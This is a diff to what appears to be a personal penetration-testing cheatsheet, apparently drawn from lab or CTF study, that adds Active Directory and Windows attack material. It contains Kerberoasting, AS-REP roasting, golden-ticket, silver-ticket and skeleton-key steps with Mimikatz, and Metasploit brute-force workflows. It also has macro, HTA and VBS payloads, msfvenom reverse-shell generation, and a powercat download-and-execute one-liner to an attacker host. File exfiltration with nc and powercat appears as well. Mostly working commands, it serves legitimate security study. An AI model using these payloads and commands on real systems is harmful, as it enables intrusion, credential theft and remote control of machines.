@@ -15,7 +15,7 @@ Standard penetration testing methodology:
 4. **🛠️ Post-Exploitation** - Maintain access and escalate privileges
    - **📊 Survey** - Gather information about the compromised system
    - **⬆️ PrivEsc** - Escalate privileges to higher-level accounts
-1. **🔄 Pivot** - Use compromised systems to access additional networks
+5. **🔄 Pivot** - Use compromised systems to access additional networks
 
 ### Additional
 
@@ -83,6 +83,8 @@ grep 'Status: Up' *.gnmap | awk '{print $2}' > live_hosts.txt
 sudo nmap -sn -iL live_hosts.txt -oA $(date +%Y-%m-%d_%H%M)_host_disc_live <TARGET>
 ```
 #### 🌐 DNS Lookups
+
+- https://viewdns.info/7
 
 - `-n`: Do **NOT** try to reverse-DNS lookup hosts
 - `-R`: Do try to reverse-DNS lookup hosts, even offline ones
@@ -487,6 +489,39 @@ smbclient -N //<TARGET_IP>/Public
 # get <filename> -> download a file
 ```
 
+### 🔐 Kerberos Attacks
+
+| Attack Type | Tools | Commands & Notes |
+| :--- | :--- | :--- |
+| **0. Initial Setup (Attacker)** | Text Editor | **CRITICAL:** Add the domain controller to your hosts file. <br> `echo "<TARGET_IP> <DOMAIN_NAME>" | sudo tee -a /etc/hosts` <br> *Example:* `echo "10.201.92.231 CONTROLLER.local" | sudo tee -a /etc/hosts` |
+| **1. User Enumeration** | **Kerbrute** | Enumerate valid AD usernames without causing lockouts. <br> `./kerbrute userenum --dc <DOMAIN_NAME> -d <DOMAIN_NAME> <USER_LIST.txt>` <br> **Link:** [Kerbrute Releases](https://github.com/ropnop/kerbrute/releases) |
+| **2. AS-REP Roasting** | **Rubeus** (on target) or **Impacket** (attacker) | Dump hashes for users with Kerberos Pre-Authentication disabled. <br> **Rubeus:** `Rubeus.exe asreproast` <br> **Impacket:** `GetUserSPNs.py -request -no-pass <DOMAIN>/<USER>` <br> **Crack with Hashcat (Mode 18200):** <br> `hashcat -m 18200 hashes.txt <WORDLIST>` <br> *Note:* Rubeus hashes may need `$23` added (e.g., `$krb5asrep$23$..`). |
+| **3. Kerberoasting** | **Rubeus** (on target) or **Impacket** (attacker) | Request service tickets (TGS) and crack them offline to get service account passwords. <br> **Rubeus:** `Rubeus.exe kerberoast` <br> **Impacket:** `GetUserSPNs.py <DOMAIN>/<USER>:<PASS> -dc-ip <TARGET_IP> -request` <br> **Crack with Hashcat (Mode 13100):** <br> `hashcat -m 13100 hashes.txt <WORDLIST>` |
+| **4. Ticket Harvesting** | **Rubeus** | Monitor memory for Kerberos tickets to use in Pass-the-Ticket attacks. <br> `Rubeus.exe harvest /interval:30` |
+| **5. Pass the Ticket** | **Mimikatz** | Steal a Kerberos ticket from LSASS memory and inject it into your own session to impersonate a user. <br> **1. (Admin Prompt):** `privilege::debug` <br> **2. Dump Tickets:** `sekurlsa::tickets /export` <br> **3. Inject Ticket:** `kerberos::ptt <ticket_file.kirbi>` <br> **4. Verify:** `klist` |
+| **6. Golden Ticket Attack** | **Mimikatz** | **Requires `krbtgt` hash.** Forge a Ticket Granting Ticket (TGT) to impersonate any user and access any resource. <br> **1. Dump krbtgt Hash & SID:** `lsadump::lsa /inject /name:krbtgt` <br> **2. Forge Ticket:** `kerberos::golden /user:<USER_TO_IMPERSONATE> /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /id:500` <br> **3. Use Ticket:** `misc::cmd` (spawns a new shell with the ticket's context). |
+| **7. Silver Ticket Attack** | **Mimikatz** | **Requires service account hash.** Forge a Ticket Granting Service (TGS) ticket to access a specific service on a specific host. <br> **1. Dump Service Hash & SID:** `lsadump::lsa /inject /name:<SERVICE_ACCOUNT>` <br> **2. Forge Ticket:** `kerberos::golden /user:<USER_TO_IMPERSONATE> /domain:<DOMAIN> /sid:<DOMAIN_SID> /service:<SERVICE> /rc4:<SERVICE_HASH> /target:<TARGET_HOST>` <br> **3. Use Ticket:** `misc::cmd` |
+| **8. Skeleton Key** | **Mimikatz** | **Requires Domain Admin on DC.** A memory patch on the Domain Controller that allows authentication for any user with a master password (default: `mimikatz`). <br> **1. (Admin Prompt on DC):** `privilege::debug` <br> **2. Inject Key:** `misc::skeleton` |
+| **Key Tools & Links** | | **Rubeus:** [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus) <br> **Impacket:** [https://github.com/fortra/impacket](https://github.com/fortra/impacket) <br> **Mimikatz:** [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz) |
+
+### 🔐 Mimikatz Commands
+
+```bash
+# Basic Mimikatz Usage
+cd Downloads
+.\mimikatz.exe
+privilege::debug
+
+# Dump Hashes
+lsadump::lsa /patch
+
+# Golden Ticket Attack
+lsadump::lsa /inject /name:krbtgt
+kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<SID> /krbtgt:<NTLM> /id:500
+misc::cmd
+# Opens new command prompt with golden ticket context
+```
+
 ## 🗄️ Redis
 
 ```bash
@@ -640,6 +675,8 @@ echo '<DATA>' | python3 -c 'import urllib.parse, sys; print(urllib.parse.unquote
 
 ### Web Hacking
 
+- https://www.exploit-db.com/google-hacking-database
+
 | Vulnerability Type                 | Identification / Enumeration                                                                                                                                                                                                       | Exploitation / Commands                                                                                                                                                                                                                                      |
 | :--------------------------------- | :--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | :----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
 | **1. Recon & Content Discovery**   |                                                                                                                                                                                                                                    |                                                                                                                                                                                                                                                              |
@@ -710,6 +747,84 @@ hash-identifier
 
 ## 💥 Brute-Forcing
 
+### 🎯 Metasploit Login Scanners
+
+Use Metasploit's built-in scanners for efficiency, automatic credential logging (creds command), and especially for brute-forcing services on pivoted networks.
+
+#### 🔍 Common Login Scanners
+```bash
+# SSH
+use auxiliary/scanner/ssh/ssh_login
+
+# FTP
+use auxiliary/scanner/ftp/ftp_login
+
+# SMB
+use auxiliary/scanner/smb/smb_login
+
+# HTTP Basic Auth
+use auxiliary/scanner/http/http_login
+
+# MySQL
+use auxiliary/scanner/mysql/mysql_login
+
+# PostgreSQL
+use auxiliary/scanner/postgres/postgres_login
+
+# Telnet
+use auxiliary/scanner/telnet/telnet_login
+```
+
+#### ⚙️ Core Workflow
+```bash
+# Find scanner modules
+search <service>_login
+
+# Use the module
+use auxiliary/scanner/<service>/<module>
+
+# Show options
+show options
+
+# Set target and credentials
+set RHOSTS <TARGET_IP>
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set STOP_ON_SUCCESS true
+
+# Run the scan
+run
+```
+
+#### 🔑 Key Credential Options
+| Option | Description | Use Case |
+|--------|-------------|----------|
+| `USERNAME`, `PASSWORD` | Single username/password combination | Default credentials (admin:admin) |
+| `USER_FILE`, `PASS_FILE` | Username and password wordlists | Standard brute-force attacks |
+| `USERPASS_FILE` | Username/password pairs from single file | Found credential lists |
+
+#### 📚 Wordlist Recommendations
+| Service | User List | Password List | Notes |
+|---------|-----------|---------------|-------|
+| SSH/FTP/General | `common_users.txt` | `unix_passwords.txt` | Go-to combination for most services |
+| SMB (Windows) | `common_users.txt` | `common_passwords.txt` | Try Administrator first |
+| HTTP (Web) | Custom from recon | `common_passwords.txt` | Target specific usernames |
+| Root/Admin | `root` or `Administrator` | `unix_passwords.txt` | High-privilege accounts |
+| Special Case | N/A | `root_userpass.txt` | Use with USERPASS_FILE |
+
+#### 💡 Practical Example: SSH Brute-Force
+```bash
+msf6 > use auxiliary/scanner/ssh/ssh_login
+msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS <TARGET_IP>
+msf6 auxiliary(scanner/ssh/ssh_login) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+msf6 auxiliary(scanner/ssh/ssh_login) > set STOP_ON_SUCCESS true
+msf6 auxiliary(scanner/ssh/ssh_login) > run
+
+# Check saved credentials
+msf6 > creds
+```
+
 ### 🔨 Brute-Forcing Web & SSH Logins with Hydra
 ```bash
 # Web Login brute-force (ONLINE - use small wordlist to avoid lockouts)
@@ -779,6 +894,9 @@ cat "C:\\Programs and Files (x86)\\"
 
 hashdump  # CrackStation
 # --- kiwi (like mimikatz) ---
+ps -s | grep svchost
+migrate <PID>
+
 load kiwi
 creds_all
 
@@ -844,7 +962,7 @@ set lport <LISTEN_PORT>
 # Msfvenom commands
 msfvenom -l payloads
 msfvenom --list formats
-msfvenom -p php/meterpreter/reverse_tcp LHOST=<TARGET> -f raw -e php/base64  # NOTE: need to add <?php ?> tags to file
+msfvenom -p php/meterpreter/reverse_tcp LHOST=<TARGET> LPORT=<TARGET_PORT> -f raw -e php/base64  # NOTE: need to add <?php ?> tags to file
 msfvenom -p php/reverse_php LHOST=<TARGET> LPORT=<TARGET_PORT> -f raw > reverse_shell.php  # NOTE: need to add <?php ?> tags to file
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<TARGET> LPORT=<TARGET_PORT> -f elf > rev_shell.elf
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<TARGET> LPORT=<TARGET_PORT> -f exe > rev_shell.exe
@@ -886,6 +1004,7 @@ auxiliary/scanner/http/http_options
 
 ## 🐚 Reverse & Bind Shells
 
+- https://www.revshells.com/
 - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
 - http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 - https://github.com/danielmiessler/SecLists/tree/master/Web-Shells
@@ -1011,7 +1130,8 @@ curl -o- <URL>/index.php?page=//<CALLBACK_IP>/somefile
 # Capture NTLMv2-SSP Hash format: <USER>:<HOST>:<HASH>...
 
 # Use evil-winrm to access machine with captured credentials
-evil-winrm -i <HOST> -u <USER> -p <PASSWORD>
+evil-winrm -u <USER> -p <PASSWORD> -i <HOST>
+evil-winrm -u <USER> -H <PASS_HASH> -i <HOST>
 
 # Search for flags on Windows
 Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Name flag.txt
@@ -1198,6 +1318,342 @@ nc -lvnp <PORT>
 powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 
+## 🪟 Windows Payloads
+
+### 🔧 Windows Script Host (WSH) - .vbs
+
+```vbs
+# VBS Payload to Execute a Command
+# Save as 'payload.vbs'
+Set shell = WScript.CreateObject("Wscript.Shell")
+shell.Run("cmd.exe"), 0, True
+```
+
+```bash
+# Execution Commands (on Target)
+# Standard execution:
+wscript.exe C:\path\to\payload.vbs
+cscript.exe C:\path\to\payload.vbs
+
+# Evasion: Execute a renamed .txt file:
+wscript.exe /e:VBScript C:\path\to\payload.txt
+```
+
+### 🌐 HTML Application (HTA) - .hta
+
+```html
+<!-- HTA Payload to Execute a Command -->
+<!-- Save as 'payload.hta' -->
+<html>
+<body>
+<script>
+    new ActiveXObject('WScript.Shell').Run('cmd.exe');
+</script>
+</body>
+</html>
+```
+
+```bash
+# HTA Reverse Shell (msfvenom)
+# 1. (Attacker) Generate the .hta payload:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f hta-psh -o thm.hta
+
+# 2. (Attacker) Host the file:
+python3 -m http.server 8080
+
+# 3. (Attacker) Start listener:
+nc -lvnp <PORT>
+
+# 4. (Target) Victim browses to http://<ATTACKER_IP>:8080/thm.hta and runs it.
+
+# HTA Server (Metasploit)
+# Automates payload generation and hosting.
+msfconsole -q
+use exploit/windows/misc/hta_server
+set LHOST <ATTACKER_IP>
+set PAYLOAD windows/meterpreter/reverse_tcp
+exploit
+```
+
+### 📄 Visual Basic for Applications (VBA) / Macros
+
+```vba
+# VBA Payload to Execute a Command
+# Place this code inside a Word/Excel macro.
+Sub AutoOpen()
+    Dim payload As String
+    payload = "cmd.exe"
+    CreateObject("WScript.Shell").Run payload, 0
+End Sub
+# Note: The function must be named AutoOpen() or Document_Open() to run automatically.
+```
+
+```bash
+# VBA Reverse Shell (msfvenom)
+# 1. (Attacker) Generate the VBA payload code:
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f vba
+
+# 2. (Attacker) Copy the generated code.
+
+# 3. (Target) Paste the code into the VBA editor of a Word/Excel document.
+#    - Change 'Sub Workbook_Open()' to 'Sub Document_Open()' if using Word.
+#    - Save the file as a Macro-Enabled type (e.g., .docm).
+
+# 4. (Attacker) Start Metasploit listener:
+msfconsole -q -x "use multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost <IP>; set lport <PORT>; run"
+
+# 5. (Target) Victim opens the document and enables macros.
+```
+
+### 💻 PowerShell (PSH) - .ps1
+
+```powershell
+# PowerShell Execution Policy Bypass
+# Prepend this to your command to ensure scripts can run.
+powershell -ExecutionPolicy Bypass -File C:\path\to\script.ps1
+```
+
+```bash
+# PowerShell Reverse Shell (In-Memory Download & Execute)
+# The 'powercat' tool is a popular example.
+
+# 1. (Attacker) Host the payload script (e.g., powercat.ps1):
+python3 -m http.server 8080
+
+# 2. (Attacker) Start listener:
+nc -lvnp <PORT>
+
+# 3. (Target) Execute the one-liner to download and run the payload in memory:
+powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>:8080/powercat.ps1'); powercat -c <ATTACKER_IP> -p <PORT> -e cmd"
+```
+
+### 🐱 Powercat Cheatsheet
+
+**Primary Reference:** [Powercat GitHub Repository](https://github.com/besimorhino/powercat)
+
+Powercat is the "Netcat of PowerShell." It's a versatile tool for creating reverse/bind shells, transferring files, and port scanning, all natively within PowerShell.
+
+```powershell
+# Delivery (In-Memory Download & Execute)
+# On the Target Machine
+powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>:<HTTP_PORT>/powercat.ps1')"
+```
+
+| Scenario | Attacker Command | Target Command (after in-memory download) |
+| :--- | :--- | :--- |
+| **Reverse Shell** | `powercat -l -p <LISTEN_PORT>` or `nc -lvnp <LISTEN_PORT>` | `powercat -c <ATTACKER_IP> -p <LISTEN_PORT> -e cmd` |
+| **Bind Shell** | `powercat -c <TARGET_IP> -p <LISTEN_PORT>` | `powercat -l -p <LISTEN_PORT> -e cmd` |
+| **File Upload (to Target)** | `powercat -l -p <LISTEN_PORT> -i C:\path\to\file.exe` | `powercat -c <ATTACKER_IP> -p <LISTEN_PORT> -o C:\Temp\file.exe` |
+| **File Download (from Target)**| `powercat -l -p <LISTEN_PORT> -o downloaded_file.txt` | `powercat -c <ATTACKER_IP> -p <LISTEN_PORT> -i C:\path\to\secret.txt` |
+
+### 🎯 Msfvenom & Meterpreter Payload Cheatsheet
+
+**Primary Reference:** [Metasploit Payload Cheatsheet by Rapid7](https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/)
+
+`msfvenom` is the command-line tool used to generate Metasploit payloads. Meterpreter is the advanced, feature-rich payload that provides an interactive shell with extensive capabilities.
+
+```bash
+# Basic Syntax
+msfvenom -p <PAYLOAD> LHOST=<ATTACKER_IP> LPORT=<LISTEN_PORT> -f <FORMAT> -o <OUTPUT_FILE>
+```
+
+#### Common Meterpreter Payloads (`-p`)
+
+| Target Platform | Payload Name |
+| :--- | :--- |
+| **Windows (64-bit)** | `windows/x64/meterpreter/reverse_tcp` |
+| **Windows (32-bit)** | `windows/meterpreter/reverse_tcp` |
+| **Linux (64-bit)** | `linux/x64/meterpreter/reverse_tcp` |
+| **Linux (32-bit)** | `linux/x86/meterpreter/reverse_tcp` |
+| **PHP (Web)** | `php/meterpreter/reverse_tcp` |
+| **ASPX (Web)** | `windows/x64/meterpreter/reverse_tcp` (use `-f aspx`) |
+| **Java (Web)** | `java/jsp_shell_reverse_tcp` (produces a JSP web shell) |
+
+#### Common Output Formats (`-f`)
+
+| Format | Extension | Use Case |
+| :--- | :--- | :--- |
+| `exe` | `.exe` | Standard Windows executable. |
+| `elf` | (none) | Standard Linux executable. |
+| `psh-cmd`| `.ps1` | A PowerShell command to run a payload (often for in-memory). |
+| `aspx` | `.aspx` | For Microsoft IIS web servers. |
+| `php` | `.php` | For PHP web servers. |
+| `vba` | `.vba` | For Microsoft Office macros. |
+| `war` | `.war` | For Java application servers (e.g., Tomcat). |
+| `c` | `.c` | Raw shellcode formatted for a C program. |
+
+#### The Listener: `multi/handler`
+
+```bash
+# Launch msfconsole and configure the listener in one line
+msfconsole -q -x "use multi/handler; set payload <PAYLOAD_NAME>; set lhost <ATTACKER_IP>; set lport <LISTEN_PORT>; run"
+```
+
+#### Example Workflow: Create and Catch a Windows Meterpreter Shell
+
+```bash
+# 1. Generate Payload:
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f exe -o shell.exe
+
+# 2. Start Listener:
+msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.10.5; set lport 4444; run"
+
+# 3. Execute shell.exe on the target machine. A Meterpreter session will open in your console.
+```
+
+## 🔍 Initial Access & Enumeration Cheatsheet
+
+```markdown
+#####################################################################
+#           INITIAL ACCESS & ENUMERATION CHEATSHEET                 #
+#####################################################################
+
+#====================================================================
+# A) LINUX ENUMERATION COMMANDS
+#====================================================================
+
+#--------------------------------------------------------------------
+# 1. System Information
+#--------------------------------------------------------------------
+# OS, Kernel & Release Info
+ls /etc/*-release
+cat /etc/os-release
+hostname
+
+# List Installed Packages
+rpm -qa               # (RPM-based: CentOS/Fedora)
+dpkg -l               # (Debian-based: Ubuntu)
+
+#--------------------------------------------------------------------
+# 2. User & Privilege Enumeration
+#--------------------------------------------------------------------
+# Current User Info
+whoami
+id
+
+# Logged-in Users & Activity
+who                   # Who is logged in
+w                     # Who is logged in and what they are doing
+last                  # History of last logged-in users
+
+# Allowed Sudo Commands
+sudo -l
+
+# Sensitive User Files
+cat /etc/passwd       # List all local users
+cat /etc/group        # List all local groups
+sudo cat /etc/shadow  # Read user password hashes (requires root)
+ls -lh /var/mail/     # Check for user mailboxes
+
+#--------------------------------------------------------------------
+# 3. Network Enumeration
+#--------------------------------------------------------------------
+# IP & Interface Info
+ip address show       # (or 'ip a s')
+ifconfig -a           # (Older systems)
+
+# DNS Server Info
+cat /etc/resolv.conf
+
+# Active Connections & Listening Ports
+netstat -tulpn        # (Common and effective)
+netstat -atupn        # (Includes established connections)
+lsof -i               # List open files by network service
+lsof -i :<PORT>       # Filter by a specific port
+
+# ARP Cache (Discover nearby hosts)
+arp -a
+
+#--------------------------------------------------------------------
+# 4. Process & Service Enumeration
+#--------------------------------------------------------------------
+# List Running Processes
+ps -ef                # (Standard syntax, shows all processes)
+ps aux                # (BSD syntax, provides more detail)
+ps axf                # (Shows process tree/hierarchy)
+
+#====================================================================
+# B) WINDOWS ENUMERATION COMMANDS
+#====================================================================
+
+#--------------------------------------------------------------------
+# 1. System Information
+#--------------------------------------------------------------------
+# OS, Build, and Hotfix Info
+systeminfo
+wmic qfe get Caption,Description  # List installed patches
+
+# List Installed Applications
+wmic product get name,version,vendor
+
+# List Running Services
+net start
+
+#--------------------------------------------------------------------
+# 2. User & Privilege Enumeration
+#--------------------------------------------------------------------
+# Current User Info
+whoami
+whoami /priv          # Show current user's privileges
+whoami /groups        # Show current user's group memberships
+
+# List Users & Groups
+net user              # List all local users
+net localgroup        # List all local groups
+net localgroup administrators  # List members of the Administrators group
+
+# Password & Account Policy
+net accounts          # (Local policy)
+net accounts /domain  # (Domain policy)
+
+#--------------------------------------------------------------------
+# 3. Network Enumeration
+#--------------------------------------------------------------------
+# IP & Interface Info
+ipconfig
+ipconfig /all         # (More detail, including DNS servers)
+
+# Active Connections & Listening Ports
+netstat -abno         # Shows All connections, Binaries, Numeric output, and PIDs
+
+# ARP Cache (Discover nearby hosts)
+arp -a
+
+#====================================================================
+# C) COMMON NETWORK SERVICE ENUMERATION
+#====================================================================
+
+#--------------------------------------------------------------------
+# 1. DNS (Zone Transfer)
+#--------------------------------------------------------------------
+# Attempt a DNS zone transfer to dump all records for a domain.
+dig -t AXFR <DOMAIN_NAME> @<DNS_SERVER_IP>
+
+#--------------------------------------------------------------------
+# 2. SMB (File Sharing)
+#--------------------------------------------------------------------
+# List all shares on a Windows host.
+net share
+
+#--------------------------------------------------------------------
+# 3. SNMP (Network Management)
+#--------------------------------------------------------------------
+# Query a device for information using a community string (e.g., 'public').
+git clone https://gitlab.com/kalilinux/packages/snmpcheck.git
+./snmpcheck-1.9.rb <TARGET_IP> -c public
+
+#====================================================================
+# D) KEY EXTERNAL TOOLS & LINKS
+#====================================================================
+
+| Tool / Resource | Link | Description |
+| :--- | :--- | :--- |
+| **LinEnum.sh** | [GitHub Link](https://github.com/rebootuser/LinEnum) | Popular automated enumeration script for Linux. |
+| **Sysinternals Suite** | [Microsoft Docs](https://docs.microsoft.com/en-us/sysinternals/downloads/) | Powerful suite of GUI/CLI utilities for Windows enumeration (`PsLoggedOn`, `Process Explorer`, etc.). |
+| **Process Hacker** | [Homepage](https://processhacker.sourceforge.io/) | Advanced GUI task manager for Windows. |
+| **Seatbelt** | [GitHub Link](https://github.com/GhostPack/Seatbelt) | C# enumeration tool, part of GhostPack. Excellent for situational awareness. |
+```
+
 ## 🐧 Linux Survey
 
 ```bash
@@ -1219,7 +1675,7 @@ whoami; id; pwd; hostname;
 echo -e "\n===== OS & KERNEL INFO =====";
 uname -a;
 cat /etc/issue;
-cat /etc/os-release;
+cat /etc/*release*;
 
 echo -e "\n===== INTERESTING SUID FILES (FILTERED) =====";
 echo "Review this list carefully. Check GTFOBins for each binary: https://gtfobins.github.io/";
@@ -1544,11 +2000,12 @@ REGEXES="0" ./linpeas.sh 2>&1 | tee linpeas_output.txt
 
 ```bash
 # SCP
-scp -P <PORT> <USER>@<IP_ADDR>:/tmp/linpeas_output.txt ~/
+scp <USER>@<TARGET>:/tmp/linpeas_output.txt ~/
 
 # NC
 nc -l -p <PORT> > ~/linpeas_output.txt
 cat /tmp/linpeas_output.txt | nc <ATTACKER_IP> <PORT>
+# wait a moment, then CTRL+C
 ```
 
 ### 🚨 CVE-2021-4034 - Pkexec Local Privilege Escalation (privesc)
@@ -1559,7 +2016,7 @@ curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
 ip a ; python3 -m http.server 8000
 
 # REMOTE: Download and run privesc
-curl -o PwnKit http://<KALI_IP>:8000/PwnKit
+wget http://<KALI_IP>:8000/PwnKit
 chmod +x PwnKit
 ./PwnKit
 ```
@@ -1716,7 +2173,10 @@ db.admin.update({ "name" : "administrator" }, { $set: { "x_shadow" : "<HASH>" } 
 ## 🖥️ RDP via xfreerdp
 
 ```bash
-xfreerdp3 /clipboard /dynamic-resolution /cert:ignore /v:<TARGET> /u:<USER> /p:'<PASSWORD>'
+# Connects to RDP and mounts share
+xfreerdp3 /clipboard /dynamic-resolution /cert:ignore /v:<TARGET> /u:<USER> /p:'<PASSWORD>' /drive:'/usr/share/windows-resources/mimikatz/x64',share
+
+\\tsclient\share\mimikatz.exe
 ```
 
 ## 🐧 Linux Commands
@@ -1771,8 +2231,7 @@ net localgroup "Remote Management Users" <USERNAME> /add
 ### 💻 PowerShell
 
 ```powershell
-###
-
+### Basics
 Get-Content
 Set-Location
 Get-Command
@@ -1819,6 +2278,26 @@ gpmc.msc
 # syncs via the share SYSVOL at C:\Windows\SYSVOL\sysvol\
 gpupdate /force
 
+# PowerView - AD Enumeration
+powershell -ep bypass
+. .\Downloads\PowerView.ps1
+Get-NetUser | select cn
+Get-NetGroup -GroupName *admin*
+
+# Bloodhound/SharpHound - AD Mapping
+powershell -ep bypass
+. .\Downloads\SharpHound.ps1    
+Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
+# - OR
+
+# SharpHound.exe alternative
+.\SharpHound.exe -c All -d CONTROLLER.local --zipfilename loot_exe.zip
+
+# Transfer Bloodhound data to attacker
+# Upload zipfile to Bloodhound: http://127.0.0.1:8080/ui/login
+
+# Upload to Bloodhound: http://127.0.0.1:8080/ui/administration/file-ingest
+
 # Change password
 Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose
 
@@ -1831,14 +2310,61 @@ Set-ADUser -ChangePasswordAtLogon $true -Identity sophie -Verbose
 ```bash
 search flag dir /b/s *flag.txt  
 whoami /priv          
-query user                 # use it to see if anyother user is currently logged in 
-net users     # list all the users
-net user administrator     # Detailed info about the user 
-net localgroup        # to list all the groups 
+query user  # use it to see if anyother user is currently logged in 
+net users  # list all the users
+net user administrator  # Detailed info about the user 
+net localgroup  # to list all the groups 
 net localgroup administrators
 ipconfig /all
-arp -a    # to see other connected devices
+arp -a # to see other connected devices
 netstat -ano  # print open ports used by services running on the system
+
+# Domains
+nltest /domain_trusts  # show domains with trust relationship
+nltest /dsgetdc: /server:  # show DC name, IP, etc.
+wmic computersystem get domain  # domain name
+systeminfo | findstr Domain  # domain name
+echo %LOGONSERVER%  # hostname of DC
+$env:LOGONSERVER  # hostname of DC
+Get-ADUser -Filter *  # AD users
+Get-ADUser -Filter * -SearchBase "CN=Users,DC=<DOMAIN>,DC=COM"  # show Users in <DOMAIN>.com ; change COM to other TLD
+
+# AntiVirus
+Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled, BehaviorMonitorEnabled, IoavProtectionEnabled, AntivirusSignatureAge, AntivirusSignatureLastUpdated
+Get-MpThreat  # see WinDefend alerts
+
+# Firewall
+Get-NetFirewallProfile | Format-Table Name, Enabled
+#Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False  # disable all FW profiles
+
+# Show Enabled Rules
+Get-NetFirewallRule | Where-Object {$_.Enabled -eq $True} | Select-Object DisplayName, Description
+
+# Test if Port is OPEN and allowed thru FW
+Test-NetConnection -ComputerName 127.0.0.1 -Port <PORT>
+(New-Object System.Net.Sockets.TcpClient("127.0.0.1", "<PORT>")).Connected
+
+# Enumerate Windows Event Logs
+Get-EventLog -List
+
+# Sysmon
+Get-Process | Where-Object { $_.ProcessName -eq "Sysmon" }
+Get-Service | where-object {$_.DisplayName -like "*sysm*"}
+findstr /si '<ProcessCreate onmatch="exclude">' C:\tools\*
+
+# Installed Software
+wmic product get name,version
+
+# Enumerate Hidden Files on All Desktops
+Get-ChildItem -Path C:\Users\* -Force -ErrorAction SilentlyContinue |
+    Where-Object { $_.PSIsContainer -and $_.Name -ne "Public" } |
+    Get-ChildItem -Path { Join-Path -Path $_.FullName -ChildPath "Desktop" } -Hidden -ErrorAction SilentlyContinue
+
+# Triage Service/Process
+net start
+wmic service where "name like '<SERVICE>'" get Name,PathName
+Get-Process -Name <NAME>
+netstat -noa | findstr "LISTENING" | findstr "<PID>"
 ```
 ### Windows Survey for PrivEsc (PowerShell)
 
@@ -2205,7 +2731,7 @@ cmd.exe /c echo y \| .\plink.exe -R <ATTACKER_PORT>:<TARGET_IP>:<TARGET_PORT> us
 
 ```bash
 # Add HOST for local DNS resolution in /etc/hosts file
-echo '<TARGET> <TARGET_HOST>' | sudo tee -a /etc/hosts
+echo '<IP> <HOST>' | sudo tee -a /etc/hosts
 ```
 
 ## 🎯 EZ Wins & Searching Info
@@ -2277,13 +2803,74 @@ echo "    deactivate"
     *   Curated for finding common file names and extensions
 
 ### 🔓 Password Attacks
-#### Online Brute-Force (Hydra, ffuf)
+
+```markdown
+#####################################################################
+#                 PASSWORD ATTACKS CHEATSHEET                       #
+#####################################################################
+
+#====================================================================
+# 1. WORDLIST GENERATION & PROFILING
+#====================================================================
+# Description: Creating targeted wordlists is the key to successful password attacks.
+
+| Tool / Technique | Command / Method | Description |
+| :--- | :--- | :--- |
+| **Default Passwords** | Research online databases. | Always check for default credentials before launching a brute-force attack. <br> **Links:** [cirt.net](https://cirt.net/passwords), [default-password.info](https://default-password.info/) |
+| **Common Wordlists** | Use `SecLists` (the modern standard). | A massive collection of high-quality lists for usernames, passwords, fuzzing, etc. <br> **Link:** [SecLists](https://github.com/danielmiessler/SecLists) |
+| **Wordlist Management** | `cat list1.txt list2.txt > combined.txt` <br> `sort combined.txt \| uniq > cleaned.txt` | Combine multiple lists and remove duplicates to create a master list. |
+| **`cewl` (Web Scraping)** | `cewl -w <output_file> -d <depth> -m <min_word_len> <URL>` | Crawls a website to create a custom wordlist based on its content. Excellent for company-specific passwords. |
+| **`crunch` (Keyspace)** | `crunch <min> <max> <charset> -o <output_file>` | Generates a wordlist based on a specific character set and length. Good for brute-forcing known patterns. <br> *Example:* `crunch 4 4 01234` |
+| | `crunch <len> <len> -t <pattern>` | Generates words based on a pattern. `%`=number, `@`=lowercase, `,`=uppercase, `^`=symbol. <br> *Example:* `crunch 6 6 -t pass%%` (creates pass00-pass99) |
+| **`CUPP` (Profiling)** | `git clone https://github.com/Mebus/cupp.git` <br> `python3 cupp.py -i` | Interactively builds a highly-targeted wordlist based on personal information about a target (name, birthday, pet's name, etc.). |
